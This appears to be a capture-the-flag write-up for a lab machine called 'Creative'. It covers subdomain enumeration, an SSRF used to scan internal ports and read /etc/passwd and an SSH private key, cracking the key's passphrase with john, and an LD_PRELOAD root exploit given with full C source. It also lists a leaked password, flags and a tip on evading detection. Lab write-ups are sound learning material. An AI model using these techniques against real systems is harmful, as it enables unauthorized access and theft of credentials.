# Creative

- Nmap verbose indicates port 80 is open so i check to see if there is a website. 
- Had trouble logging in so i added the website domain name from the url to the host file 

![[Pasted image 20240714073235.png]]

Server info:
nginx/1.18.0 (Ubuntu)

I search launchpad to see what it's uploaded to: `ubuntu nginx 1.18.0 launchpad`

![[Pasted image 20240714074246.png]]

- So we see it's included with focal.
- We now search for: `ubuntu releases focal`
- Click on releases and see if it's up-to date, or old with possible vulnerabilities   

![[Pasted image 20240714074750.png]]

- The wiki is a better option to view releases: https://wiki.ubuntu.com/Releases
- Focal looks like a recent edition so it's probably not vulnerable.
- Time to run gobuster.

**Nothing Found**

_Trying to get subdomains_
https://github.com/aboul3la/Sublist3r

```php
sublist3r -b -v -d creative.thm -p 80
```

Sublister crashed the server for a while so i switched to gobuster

```php
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://creative.thm/ --append-domain
```

```php
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: beta.creative.thm Status: 200 [Size: 591]
Progress: 19966 / 19967 (99.99%)
===============================================================
Finished
===============================================================
```

Let's add it to the hosts file. We can add it to the same line, separated by a comma, as the first domain and ip entry.
e.g `<IP>    domain1, domain2`

![[Pasted image 20240714084142.png]]

- I set up a directory called web-test and move inside it
- I create a test index.html and run python server P-80
- Enter my IP and see if it shows my page

![[Pasted image 20240714085755.png]]

So we have some type of SSRF attack i think, but what now?

Simply hosting a malicious PHP script doesn’t actually do anything, since the website just displays the source of page requested.

Finally, I decided to use this vulnerability to enumerate the machine further.

If we make a request to [http://localhost](http://localhost) via the website, we get the HTML of the creative.thm website:

![](https://miro.medium.com/v2/resize:fit:913/1*Z4cqIwNypgkL5Itcuwl46g.png)

What if we try [http://localhost:port](http://localhost:port) to see if there are any other HTTP services that are not accessible from outside?
To do this quickly, I’ll use a custom python script. This is totally possible to do via Burp Intruder, but it works very slowly with the free version of Burp.

Here is the python script:

```python
import requests
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

def send_post_request(url, payload, headers):
    try:
        response = requests.post(url, data=payload, headers=headers)
        content_length = response.headers.get('Content-Length')
        if content_length != '13':  # Check if content length isn't 13
            print(f"POST request to {url} with payload {payload} returned status code: {response.status_code}, content length: {content_length}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending POST request: {e}")

def main():
    base_url = "http://beta.creative.thm"
    headers = {
        "Host": "beta.creative.thm",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "http://beta.creative.thm",
        "Connection": "close",
        "Referer": "http://beta.creative.thm/",
        "Upgrade-Insecure-Requests": "1"
    }

    # Using ThreadPoolExecutor to run 20 threads concurrently
    with ThreadPoolExecutor(max_workers=20) as executor:
        for port_number in range(1, 65536):
            url = f"http://localhost:{port_number}"
            payload = f"url=http%3A%2F%2Flocalhost%3A{port_number}"
            executor.submit(send_post_request, base_url, payload, headers)

if __name__ == "__main__":
    main()
```

We will loop through every port number, from 1 to 65535, and send that as the POST body to [http://beta.creative.thm](http://beta.creative.thm) . The script will then print out only responses that don’t return a content length of 13, since that’s the content length of the response we get from the server for something it couldn’t connect to:

![](https://miro.medium.com/v2/resize:fit:913/1*jQa1ccfBPmiJcBSd5riI7Q.png)

As for the headers that you see in the script, it’s just the headers I copied from a request I captured with burp.

Alternatively we can use owaspzap fuzzer:

![[Pasted image 20240714094850.png]]

Response:

```php
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Directory listing for /</title>
</head>
<body>
<h1>Directory listing for /</h1>
<hr>
<ul>
<li><a href="bin/">bin@</a></li>
<li><a href="boot/">boot/</a></li>
<li><a href="dev/">dev/</a></li>
<li><a href="etc/">etc/</a></li>
<li><a href="home/">home/</a></li>
<li><a href="lib/">lib@</a></li>
<li><a href="lib32/">lib32@</a></li>
<li><a href="lib64/">lib64@</a></li>
<li><a href="libx32/">libx32@</a></li>
<li><a href="lost%2Bfound/">lost+found/</a></li>
<li><a href="media/">media/</a></li>
<li><a href="mnt/">mnt/</a></li>
<li><a href="opt/">opt/</a></li>
<li><a href="proc/">proc/</a></li>
<li><a href="root/">root/</a></li>
<li><a href="run/">run/</a></li>
<li><a href="sbin/">sbin@</a></li>
<li><a href="snap/">snap/</a></li>
<li><a href="srv/">srv/</a></li>
<li><a href="swap.img">swap.img</a></li>
<li><a href="sys/">sys/</a></li>
<li><a href="tmp/">tmp/</a></li>
<li><a href="usr/">usr/</a></li>
<li><a href="var/">var/</a></li>
</ul>
<hr>
</body>
</html>
```

So, if the file system is hosted here, maybe we can access /etc/passwd?

![[Pasted image 20240714101538.png]]

Vim to sort the file better. It's not perfect but it'll do for now: 
```php
s/ /\r/g
```

Found a user. Also confirmed with the passwd file:

![[Pasted image 20240714102009.png]]

Maybe we can use hydra on the ssh port?

Still using the same method i get the user flag:

![[Pasted image 20240714102639.png]]

**9a1ce90a7653d74ab98630b47b8b4a84**

I managed to pull the private id_rsa key and added it to a text file on my machine.

![[Pasted image 20240714105131.png]]

The key is protected with a passphrase. We can try to use “John” to crack the passphrase. First, we need to translate the key into a hash that john can understand:

```php
ssh2john id_rsa > fjohn
```

Now, we can try to crack it with the rockyou.txt wordlist:

```php
john --wordlist/usr/share/wordlist/rockyou.txt
```

![[Pasted image 20240714105230.png]]

Finally we get onto the machine.

---

**Priv**

**SUID**
/usr/bin/chsh

![[Pasted image 20240714110155.png]]

`echo "saad:MyStrongestPasswordYet$4291" > creds.txt`

And we find a password! Using this password we can now run sudo -l:

![](https://miro.medium.com/v2/resize:fit:913/1*QZVTomlJLk-wNy_661w5Wg.png)

We can see that Saad can run “ping” as root. But that doesn’t really help us, as ping isn’t a binary that can be abused to escalate our privileges. (You can kind of understand that from the fact that “ping” doesn’t have an entry on [GTFOBins](https://gtfobins.github.io/)) .

But, there is one very important part in the output from sudo -l, which you might have missed if you haven’t used it for privilege escalation before:

![](https://miro.medium.com/v2/resize:fit:253/1*T6TZvY1-5RDX6G30Icnu3Q.png)

What’s this?

By Simply googling “LD_PRELOAD” we get our answer:

> LD_PRELOAD is an optional Environment Variable that is used to set/load Shared Libraries to a program or script. That means we can set the value of the LD_PRELOAD Environment Variable for a program to tell the program to load the mentioned libraries in it’s memory before starting.

Now, If we search for “ld_preload privilege escalation” we get to [this article](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/).

You can go to the article and try exploiting this yourself, which is what I did. Here are the steps:

First, we create a shell.c file in /tmp (doesn’t have to be in /tmp , but placing exploits in /tmp to avoid detection by the real users is good practice):

![](https://miro.medium.com/v2/resize:fit:330/1*6NKg6O6-87msaIFN6-7DWQ.png)

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

This is a very simple C code that simply sets the UID and GID to 0 (root), and then spawns a shell.

Next, we compile the code with “gcc” and specify that this is a shared library:

```php
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

You will get a few warning messages which you can just ignore.

Now, all that we have to do, is to run “sudo ping” while setting the environmental variable “LD_PRELOAD” to the path of our malicious library.

Before ping is executed, the library will be loaded , and since we are running this with sudo, we should be able to get a root shell!

```php 
sudo LD_PRELOAD=/dev/shm/.zod/hello/shell.so ping
```

![[Pasted image 20240714112418.png]]

**FLAG:**
**992bfd94b90da48634aed182aae7b99f**
